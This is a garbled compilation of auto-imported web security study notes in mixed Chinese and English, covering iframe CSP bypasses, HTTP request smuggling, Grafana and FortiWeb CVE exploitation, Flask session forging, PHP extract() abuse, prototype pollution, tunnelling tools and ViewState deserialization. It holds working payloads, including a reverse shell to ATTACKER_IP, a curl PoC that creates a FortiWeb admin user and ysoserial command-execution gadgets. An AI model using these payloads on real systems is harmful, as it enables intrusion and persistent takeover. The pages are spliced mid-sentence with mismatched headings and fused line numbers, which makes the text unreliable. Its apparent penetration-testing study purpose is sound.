src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe></html> # 2. srcdoc quirks that matter in real exploits 1srcdoc='<a href="#test">anchor</a>'></iframe> # 3. Iframes with CSP <a href="#iframes with csp 40" id="iframes with csp 40"></a> 123456789101112<html> <head> <meta http-equiv="Content-Security-Policy" content="script-src 'sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk'" /> </head> id="if3" srcdoc=""></iframe> id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe></html> # 4. Iframes with CSP <a href="#iframes with csp 40" id="iframes with csp 40"></a> 1234567891011121314151617import flaskfrom flask import Flaskapp = Flask(__name__)@app.route("/")def index(): resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>') resp.headers['Content-Security-Policy'] = "script-src 'self'" resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET' return resp@app.route("/cookie_s.html")def cookie_s(): return ""if __name__ == "__main__": app.run() # 5. New (2023-2025) CSP 绕过 techniques with iframes 1234// attacker.com frame const victim = window.frames[0]; victim.location = 'about:blank'; console.log(victim.name); // → leaked value # 6. New (2023-2025) CSP 绕过 techniques with iframes 123456789101112131415161718### Iframe sandboxThe content within an iframe can be subjected to additional restrictions through the use of the `sandbox` attribute. By default, this attribute is not applied, meaning no restrictions are in place.When utilized, the `sandbox` attribute imposes several limitations:- The content is treated as if it originates from a unique source.- Any attempt to submit forms is blocked.- Execution of scripts is prohibited.- Access to certain APIs is disabled.- It prevents links from interacting with other browsing contexts.- Use of plugins via `<embed>`, `<object>`, `<applet>`, or similar tags is disallowed.- Navigation of the content's top-level browsing context by the content itself is prevented.- Features that are triggered automatically, like video playback or auto-focusing of form controls, are blocked.Tip: Modern browsers support granular flags such as `allow-scripts`, `allow-same-origin`, `allow-top-navigation-by-user-activation`, `allow-downloads-without-user-activation`, etc. Combine them to grant only the minimum capabilities required by the embedded application.The attribute's value can be left empty (`sandbox

Moreover, it's possible to use listeners to steal sensitive information, not only the other pages the victim is visiting, but also the data used to filled forms and send them (凭据？) or to steal the local storage... Trapping users in the top frame captures autofill / 密码‑manager data before they notice the URL bar never changed. about:blank/data: local frames inherit the parent origin and 绕过 some content‑blocker heuristics; nested iframes can respawn even when extensions tear down third‑party frames. Permission propagation: rewriting the parent allow attribute grants nested attacker frames fullscreen/camera/microphone without obvious DOM changes. If CSP blocks inline scripts, inject a remote bootstrapper and enable srcdoc on the iframe so your 载荷 lives outside the enforced CSP of the main page. # 工具与参考入口 here here Iframe security exposed: blind spot fueling payment skimmer attacks (2025) Local Frames: exploiting inherited origins to 绕过 blockers (2025) # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content:
来源路径： 02-知识点/Web安全/HTTP 请求走私 in HTTP-2 Downgrades.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # HTTP 请求走私 in HTTP-2 Downgrades [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 HTTP 请求走私 in HTTP-2 Downgrades 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 HTTP 请求走私 in HTTP-2 Downgrades 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：HTTP 请求走私 in HTTP/2 Downgrades、Why downgrades happen、Two dominant primitive classes、Identifying a downgrade chain、利用 workflow (H2.TE example)；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 HTTP 请求走私 in HTTP/2 Downgrades Why downgrades happen Two dominant primitive classes Identifying a downgrade chain 利用 workflow (H2.TE example) h2c smuggling (clear-text upgrades) Notable real-world CVEs (2022-2025) Tooling Defensive measures # 核心要点 Browsers already speak HTTP/2, but much legacy origin infrastructure still only understands HTTP/1.1. Reverse-proxies (CDNs, WAFs, load-balancers) therefore terminate TLS + HTTP/2 at the edge and rewrite every request as HTTP/1.1 for the origin. Whenever the front-end trusts the HTTP/2 frame length but the back-end trusts CL or TE, an attacker can force them to disagree. The front-end reads exactly 13 bytes (HELLO
0

GE), thinks the request is finished and forwards that much to the origin. The back-end trusts the TE header, keeps reading until it sees the second 0

, thereby consuming the prefix of the attacker’s second request (GET /admin …). Mitigation is simple – strip or hard-code the Upgrade header at the edge except for WebSockets. CVE-2023-25690 – Apache HTTP Server mod proxy rewrite rules could be chained for request splitting and smuggling. (fixed in 2.4.56) h2cSmuggler – Python PoC by Bishop Fox to automate the clear-text upgrade attack: curl/hyper – crafting manual 载荷: curl --http2-prior-knowledge -X POST --data-binary @载荷.raw https://target. # 命令 / 载荷 / 操作片段 # 1. Identifying a downgrade chain 1curl -v --http2 https://target # 2. 利用 workflow (H2.TE example) 123456789:method: POST:path: /login:scheme: https:authority: example.comcontent-length: 13 # ignored by the edgetransfer-encoding: chunked5;ext=1
HELLO
0

GET /admin HTTP/1.1
Host: internal
X: X # 3. Tooling 1python3 h2csmuggler.py -u https://target -x 'GET /admin HTTP/1.1
Host: target

' # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/HTTP Response Smuggling - Desync 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # HTTP Response Smuggling - Desync 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 HTTP Response Smuggling - Desync 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 HTTP Response Smuggling - Desync 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：HTTP Response Smuggling / Desync、HTTP Request Queue Desynchronisation、HTTP Pipeline Desync、Multiple Nested Injections、利用 Organisation；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 HTTP Response Smuggling / Desync HTTP Request Queue Desynchronisation HTTP Pipeline Desync Multiple Nested Injections 利用 Organisation Abusing HTTP Response Queue Desynchronisation Capturing other users' requests <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a> Response Desynchronisation Content Confusion Cache Poisoning Web Cache Deception Response Splitting # 核心要点 First of all, this technique abuses a HTTP HTTP 请求走私 漏洞，so you need to know what that is: This is because we are going to be able to desynchronise the response queue so the response from the legit request of the victim is sent to the attacker, or by injecting attackers controlled content in the response to the victim. Therefore, it's needed that the smuggled request takes more time to be processed inside the back-end server. Therefore, by the time the smuggled request is processed, the communication with the attacker will be over. If in this specific situation a victim has sent a request and the smuggled request is responded before the legitimate request, the smuggled response will be sent to the victim. Therefore, the attacker will be controlling the request "performed" by the victim. Apart from being able to distribute more easily tens of exploits across legitimate users, this could also be used to cause a DoS in the server. This time consuming request is enough if we just want to try to steal the victims response. But if you want to perform a more complex 利用 this will be a common structure for the 利用. # 工具与参考入口 https://www.youtube.com/watch?v=suxDcYViwao&t=1343s # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/HTTP HTTP 请求走私 - HTTP Desync Attack.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # HTTP HTTP 请求走私 - HTTP Desync Attack [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 HTTP HTTP 请求走私 - HTTP Desync Attack 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 HTTP HTTP 请求走私 - HTTP Desync Attack 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：HTTP HTTP 请求走私 / HTTP Desync Attack、What is、Theory、Reality、Particularities；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 36 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 HTTP HTTP 请求走私 / HTTP Desync Attack What is Theory Reality Particularities Visible：Hidden Basic Examples Basic Examples of 漏洞 Types CL.TE 漏洞 (Content-Length used by Front-End, Transfer-Encoding used by Back-End) TE.CL 漏洞 (Transfer-Encoding used by Front-End, Content-Length used by Back-End) TE.TE 漏洞 (Transfer-Encoding used by both, with obfuscation) CL.CL Scenario (Content-Length used by both Front-End and Back-End) CL.0 Scenario TE.0 Scenario 0.CL Scenario Breaking the web server Forcing via hop-by-hop headers Finding HTTP HTTP 请求走私 # 核心要点 The Transfer-Encoding header specifies the form of encoding used to safely transfer the 载荷 body to the user.\ Note that this situation is not corrected in the AWS, but it can be prevented setting routing.http.drop invalid header fields.enabled and routing.http.desync mitigation mode = strictest. When trying to 利用 this with Burp Suite disable Update Content-Length and Normalize HTTP/1 line endings in the repeater because some gadgets abuse newlines, carriage returns and malformed content-lengths. Attack Scenario: The attacker sends a request where the Content-Length header's value does not match the actual content length. The attacker sends a chunked request where the chunk size (7b) and actual content length (Content-Length: 4) do not align. The attacker sends a request with obfuscated Transfer-Encoding headers. Depending on which server (front-end or back-end) fails to recognize the obfuscation, a CL.TE or TE.CL 漏洞 may be exploited. It's crucial in understanding and crafting smuggling attacks, as it influences how servers determine the end of a request. Send a request that, if the application is vulnerable, will cause the back-end server to wait for additional data. 工具 like Burp Suite's 'HTTP Request Smuggler' extension can automatically test for these vulnerabilities by sending various forms of ambiguous requests and analyzing the responses. Distinct Network Connections: The "attack" and "normal" requests should be dispatched over separate network connections. Utilizing the same connection for both doesn't validate the 漏洞's presence. Unintended User Impact: If your attack inadvertently impacts another user's request (not the "normal" request you sent for 检测), this indicates your attack influenced another application user. Continuous testing could disrupt other users, mandating a cautious approach. Some FEs only reuse the upstream BE connection if the client reused theirs. Use partial-requests to detect FE behavior that mirrors client reuse. # 命令 / 载荷 / 操作片段 # 1. The attacker controls evil.com which resolves to the same CDN edge node as the target internal.company. The victim’s browser already has an open HTTP/2 connection to evil.com. The attacker embeds a hidden <img src="https://internal.company/…"> in their page. Deploy separate certificates or IP addresses for internal and external hostnames so the browser cannot legally coalesce them. Graphql usually supports GET, POST (x-www-form-urlencoded) and POST(json). Although for security it's recommended to only allow json to prevent CSRF attacks. Enumerate Database Schema via Introspection If these objects don't need any argument to search, could retrieve all the information from them just asking for the data you want. Inside the platform you could invite people, generate API keys / service account tokens, list plugins, or install new plugins depending on the role. Grafana separates browser-readable configuration from encrypted secrets: jsonData is visible to users in the browser and is commonly enough to enumerate internal hosts, tenants, auth modes, header names, AWS regions, Elasticsearch indexes, Loki tenants, Prometheus URLs, and similar 侦察 data. secureJsonData is encrypted server-side and no longer readable from the browser after the datasource is saved. Post - 利用 workflow: From an attacker perspective, grafana.db + secret key is the pair worth stealing. Enumerate them from the filesystem, from the UI, or from the API: Recent examples include SSRF in the Infinity plugin (< 3.4.1) and abuse paths where the Image Renderer plugin turns another bug into full-read SSRF. Any authenticated user with VIEWER or higher can get code execution as the Grafana OS user (often grafana; sometimes root inside a 容器) or perform local file reads. Preconditions commonly met in real deployments: Shell on host: which duckdb must resolve for the 利用 path below. # 命令 / 载荷 / 操作片段 # 1. Interesting stuff 12345.tables.schema data_sourceSELECT id,org_id,name,type,url,access,is_default,json_data FROM data_source;SELECT id,org_id,uid,login,email,is_admin FROM user;SELECT id,org_id,uid,name,slug FROM dashboard; # 2. Plugin attack surface 1curl -s http://grafana.target/api/plugins | jq '.[].id' # 3. CVE-2024-9264 – SQL Expressions (DuckDB shellfs) post-auth RCE / LFI 12345-- 1) Prepare shellfs and run commandSELECT 1; INSTALL shellfs FROM community; LOAD shellfs;SELECT * FROM read_csv('CMD >/tmp/grafana_cmd_output 2>&1 |');-- 2) Read the output backSELECT content FROM read_blob('/tmp/grafana_cmd_output'); # 4. CVE-2024-9264 – SQL Expressions (DuckDB shellfs) post-auth RCE / LFI 1bash -c "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1" # 5. A two-bug chain allows an unauthenticated remote attacker to: Vendor advisory: FG‑IR‑25‑910 (CVE‑2025‑64446). 利用 has been observed in the wild to create persistent admin users. Interpretation: HTTP 200 → likely vulnerable; HTTP 403 → patched. Minimal-body validation 绕过 The program reads the CGI environment variable HTTP CGIINFO (derived from the HTTP header CGIINFO), Base64-decodes it, parses JSON, and copies attributes directly into the login context, setting the domain/VDOM. Keys of interest: POST the backend JSON expected by fwbcgi to perform privileged actions (e.g., create an admin user for 持久化). The action schema is FortiWeb-internal; the example above adds a local admin with full privileges. Bug: get fabric user by 令牌 () uses the 授权: Bearer < 令牌> value directly in a SQL query. Attacker supplies SQL that runs as MySQL user and can drop files via SELECT ... INTO OUTFILE, yielding code exec (webshell/.pth loader). Typical attack surface: /api/fabric/device/status (and other Fabric Connector endpoints) over HTTP/HTTPS on the management plane. Weaponization: write a .pth into FortiWeb's Python site-packages that imports os;os.system (...) on interpreter start, or drop a CGI under the webroot. Reloading services will execute the 载荷. Improper SAML signature verification lets an attacker forge FortiCloud SSO responses and log in as admin with no 凭据. Only exploitable when FortiCloud SSO login is enabled (it turns on automatically if the appliance was registered via GUI unless the checkbox was unticked). Patch the other 2025 flaws: SQL 注入 (7.6.4/7.4.8/7.2.11/7.0.11), SSO 绕过 (8.0.1/7.6.5/7.4.10), 命令注入 (7.6.6/7.4.11/7.2.12/7.0.12/8.0.2). Monitor and alert on the 检测 indicators above. # 命令 / 载荷 / 操作片段 # 1. Quick 漏洞 probe 12GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1Host: <target> # 2. Root cause chain 123456{ "username": "admin", "profname": "prof_admin", "vdom": "root", "loginname": "admin"} # 3. Root cause chain 1eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ== # 4. Minimal cURL PoC 1curl -ik 'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi' # 5. Minimal cURL PoC 123456789# Base64(JSON) for admin impersonationB64='eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ=='curl -ik \ -H "CGIINFO: $B64" \ -H 'Content-Type: application/json' \ -X POST \ --data '{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","type":"local-user","type_val":"0","password":"P@ssw0rd!"}}' \ 'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi' # 6. In this writeup it's explained how Flask allows a request starting with the charcter "@": Could allow to introduce something like "@attacker.com" in order to cause a SSRF. # 命令 / 载荷 / 操作片段 # 1. Manual 1echo "ImhlbGxvIg" | base64 -d # 2. Flask-Unsign 1pip3 install flask-unsign # 3. Decode Cookie 1flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8' # 4. Brute Force 1flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval # 5. Signing 1flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' # 6. Signing using legacy (old versions) 1flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy # 7. RIPsession 1ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt # 8. Flask Proxy to SSRF 123GET @/ HTTP/1.1Host: target.comConnection: close # 9. Flask Proxy to SSRF 123456789101112from flask import Flaskfrom requests import getapp = Flask('__main__')SITE_NAME = 'https://google.com/'@app.route('/', defaults={'path': ''})@app.route('/<path:path>')def proxy(path): return get(f'{SITE_NAME}{path}').contentapp.run(host='0.0.0.0', port=8080) # 工具与参考入口 https://www.kirsle.net/wizards/flask-session.cgi In this writeup # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 SQL 注入 SSRF 服务端请求伪造 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

By default, extract() uses EXTR OVERWRITE, meaning it replaces existing variables if they share the same name as keys in the input array. If extract() is used in a script that relies on specific variables, an attacker can manipulate them. In this example, the use of extract($ GET) allow an attacker to set the $authenticated variable to true: If extract () is combined with 文件包含，attackers can control file paths. ⚠️ As of PHP 8.1.0, write access to the entire $GLOBALS array is no longer supported. # 命令 / 载荷 / 操作片段 # 1. Overwriting Critical Variables 123456789<?php $authenticated = false; extract($_GET); if ($authenticated) { echo "Access granted!"; } else { echo "Access denied!"; }?> # 2. Overwriting Critical Variables 12http://example.com/vuln.php?authenticated=truehttp://example.com/vuln.php?authenticated=1 # 3. Poisoning 文件包含 12345<?php $page = "config.php"; extract($_GET); include "$page";?> # 4. Poisoning 文件包含 1http://example.com/vuln.php?page=../../etc/passwd # 5. Global Variable Injection 1extract($_GET); # 6. Global Variable Injection 1http://example.com/vuln.php?GLOBALS[admin]=1 # 7. Remediations 1extract($_GET, EXTR_SKIP); # 工具与参考入口 Function extract：PHP Documentation：March 21, 2001 $GLOBALS variables：PHP Documentation：April 30, 2008 The Ducks：HackThisSite：December 14, 2016 Extracttheflag!：Orel / WindTeam：February 28, 2024 # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 文件上传与文件包含 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Specifically, if only the unusual attribute is returned in the response, this could indicate the application's 漏洞: You could definitely use it in a bug chain to 利用 a 原型污染 漏洞. # 命令 / 载荷 / 操作片段 # 1. Change JSON content-type to HTML 12345app.use(bodyParser.json({ type: "application/json" }))app.post("/", function (req, res) { _.merge({}, req.body) res.send(req.body)}) # 2. Change JSON content-type to HTML 1{ "__proto__": { "_body": true, "body": "<script>evil()" } } # 3. Render UTF7 1{ "__proto__": { "content-type": "application/json; charset=utf-7" } } # 4. JSON spaces 1{ "__proto__": { "json spaces": " " } } # 5. JSON spaces 1{"foo": "bar"} -- Note the extra space # 6. Exposed Headers 1{ "__proto__": { "exposedHeaders": ["foo"] } } # 7. OPTIONS Method 123456// Original reponse: POST,GET,HEAD// Payload:{"__proto__":{"head":true}}//New response: POST;GET # 8. Status 1{ "__proto__": { "status": 510 } } # 9. Error 1234;({}).__proto__.__proto__ = {}( //throws type exception {}).__proto__.__proto__ = "x" //no-op does not throw exception # 10. Reflected Value 1{ "unusualName": "value", "__proto__": "test" } # 11. Reflected Value 12{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}// If 'b' is the only property reflected, this indicates prototype pollution in Lodash # 12. content: 来源路径： 02-知识点/Web安全/Expose local to the internet 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Expose local to the internet 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Expose local to the internet 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Expose local to the internet 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Expose local to the internet、Serveo、SocketXP、Ngrok、Telebit；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 11 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Expose local to the internet Serveo SocketXP Ngrok Telebit LocalXpose Expose Localtunnel Cloudflare Tunnel (cloudflared) Tailscale Funnel / Serve Fast Reverse Proxy (frp) Pinggy (SSH-based) Threat intel & OPSEC notes # 核心要点 From https://www.socketxp.com/ 下载，it allows to expose tcp and http: frp is a self-hosted option where you control the rendezvous server (frps) and the client (frpc). It is great for red teams that already own a VPS and want deterministic domains/ports. Recent releases add QUIC transport, 令牌 / OIDC auth, bandwidth caps, health checks, and Go-template-based range mappings—useful for quickly standing up multiple listeners that map back to implants on different hosts. # 命令 / 载荷 / 操作片段 # 1. Serveo 12345# Get a random port from serveo.net to expose local port 4444ssh -R 0:localhost:4444 serveo.net# Expose a web listening in localhost:300 in a random https URLssh -R 80:localhost:3000 serveo.net # 2. SocketXP 12345# Expose tcp port 22socketxp connect tcp://localhost:22# Expose http port 8080socketxp connect http://localhost:8080 # 3. Ngrok 12345# Expose web in 3000ngrok http 8000# Expose port in 9000 (it requires a credit card, but you won't be charged)ngrok tcp 9000 # 4. Telebit 12345# Expose web in 3000/Users/username/Applications/telebit/bin/telebit http 3000# Expose port in 9000/Users/username/Applications/telebit/bin/telebit tcp 9000 # 5. LocalXpose 12345# Expose web in port 8989loclx tunnel http -t 8989# Expose tcp port in 4545 (requires pro)loclx tunnel tcp --port 4545 # 6. Expose 12345# Expose web in 3000./expose share http://localhost:3000# Expose tcp port in port 4444 (REQUIRES PREMIUM)./expose share-port 4444 # 7. Localtunnel 12# Expose web in port 8000npx localtunnel --port 8000 # 8. Cloudflare Tunnel (cloudflared) 12345678# Quick Tunnel exposing localhost:8080 (random trycloudflare subdomain)cloudflared tunnel --url http://localhost:8080# Named tunnel bound to a DNS recordcloudflared tunnel login # one-time device authcloudflared tunnel create my-tunnelcloudflared tunnel route dns my-tunnel app.example.comcloudflared tunnel run my-tunnel --config tunnel.yml # 9. Tailscale Funnel / Serve 12345678# Share localhost:3000 within the tailnetsudo tailscale serve 3000# Publish it publicly on port 443 with Funnelsudo tailscale funnel --https=443 localhost:3000# Forward raw TCP (expose local SSH)sudo tailscale funnel --tcp=10000 tcp://localhost:22 # 10. Fast Reverse Proxy (frp) 123456789101112131415161718192021# Server: bind TCP/HTTP entry points and enable dashboard./frps -c frps.toml# Client: forward local 22 to remote port 6000 and a web app to vhost./frpc -c <<'EOF'serverAddr = "c2.example.com"serverPort = 7000proxiesname = "ssh"type = "tcp"localIP = "127.0.0.1"localPort = 22remotePort = 6000proxiesname = "panel"type = "http"localPort = 8080customDomains = ["panel.example.com"]EOF # 11. Pinggy (SSH-based) 12# Random subdomain exposing localhost:3000 via SSH reverse tunnelssh -p 443 -R0:localhost:3000 a.pinggy.io # 工具与参考入口 https://serveo.net/ https://www.socketxp.com/ 下载 https://ngrok.com/ https://telebit.cloud/ https://localxpose.io/ https://expose.dev/ https://github.com/localtunnel/localtunnel Cloudflare Docs：Create a locally-managed tunnel Proofpoint：Threat Actor Abuses Cloudflare Tunnels to Deliver RATs # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/Exploiting VIEWSTATE Knowing the Secret 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Exploiting VIEWSTATE Knowing the Secret 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Exploiting VIEWSTATE Knowing the Secret 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Exploiting VIEWSTATE Knowing the Secret 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Exploiting VIEWSTATE Knowing the Secret、When is the secret enough?、Quick triage checklist、Forging the 载荷 with ysoserial.net、Legacy targets (.NET 4.0 and below)；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Exploiting VIEWSTATE Knowing the Secret When is the secret enough? Quick triage checklist Forging the 载荷 with ysoserial.net Legacy targets (.NET 4.0 and below) Modern targets (.NET 4.5 and above) Common gotchas VIEWSTATEGENERATOR is helpful, but mostly for legacy targets ViewStateUserKey will break otherwise valid 载荷 GET requests can also work EVENTVALIDATION can be abused with the same secrets Why this still matters in 2025 # 核心要点 If you don't know the keys yet, start with the sister page about recovering / guessing them. This page is for the case where you already have the validationKey (and sometimes the decryptionKey) and want to forge a valid malicious VIEWSTATE. The 载荷 also depends on the target page path and application path. Before generating the 载荷，collect: If the page is configured with ViewStateEncryptionMode="Always" but runs on .NET < 4.5, remove VIEWSTATEENCRYPTED from the request and send an unencrypted but correctly signed 载荷. If the 载荷 fails and you suspect the path or app path is wrong, retry with --isdebug. The plugin prints the derived values and helps validate whether your guess matches the target's VIEWSTATEGENERATOR / path logic. Recent ysoserial.net builds also expose --minify, which is handy when you need to keep the forged 载荷 short enough for WAF, proxy, or URL-length constraints. 2025 real-world cases such as hardcoded machineKey values in vendor products turned “knowing the secret” into a practical internet-scale 利用 path. In shared IIS / SharePoint farms, one recovered key pair can often be replayed laterally against sibling applications that trust the same configuration. # 命令 / 载荷 / 操作片段 # 1. Legacy targets (.NET 4.0 and below) 123456ysoserial.exe -p ViewState -g TypeConfuseDelegate \ -c "cmd /c whoami" \ --generator=CA0B0334 \ --islegacy \ --validationalg="SHA1" \ --validationkey="<VALIDATION_KEY>" # 2. Modern targets (.NET 4.5 and above) 12345678ysoserial.exe -p ViewState -g TextFormattingRunProperties \ -c "cmd /c whoami" \ --path="/content/default.aspx" \ --apppath="/" \ --validationalg="HMACSHA256" \ --validationkey="<VALIDATION_KEY>" \ --decryptionalg="AES" \ --decryptionkey="<DECRYPTION_KEY>" # 3. It is simple to test for SQL 注入 (SQLite) by manipulating the projection and selection fields that are passed to the content provider.\ You can try to abuse this parameters to test for SQL injections: Automatic SQLInjection discovery by Drozer Exported provider, readPermission set, writePermission omitted update(uri, values, where, whereArgs) returns rows-affected; UNIQUE constraint errors also indicate a write attempt happened Attack controls WHERE to evaluate a Boolean expression over a subquery that reads secret data from co-located tables Enumerate exported providers and check perms: Look for providers with readPermission set but writePermission missing Works only if the target table (e.g., sms) is in the same SQLite database used by the vulnerable provider insert()/update()/delete() must be callable by unprivileged apps (writePermission omitted) Always declare both readPermission and writePermission on exported providers; prefer android:exported="false" by default scanner.provider.exported – list only providers with android:exported="true". # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/Web安全/Event Loop Blocking + Lazy images 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Event Loop Blocking + Lazy images 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Event Loop Blocking + Lazy images 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Event Loop Blocking + Lazy images 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Event Loop Blocking + Lazy images、Practical caveats、Reliability notes；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 Event Loop Blocking + Lazy images Practical caveats Reliability notes # 核心要点 In this 利用，@aszx87410 mixes the lazy image side channel technique through a HTML injection with kind of event loop blocking technique to leak chars. This is a different 利用 for the CTF chall that was already commented in the following page. take a look for more info about the challenge: The idea behind this 利用 is: An attacker can inject a post starting with "A", then some HTML tag (like a big <canvas) will fulfil most of the screen and some final <img lazy tags to load things. Then, while the bot is accessing the page, the attacker will send fetch requests. If the images injected in the post are being loaded, these fetch requests will take longer, so the attacker knows that the post 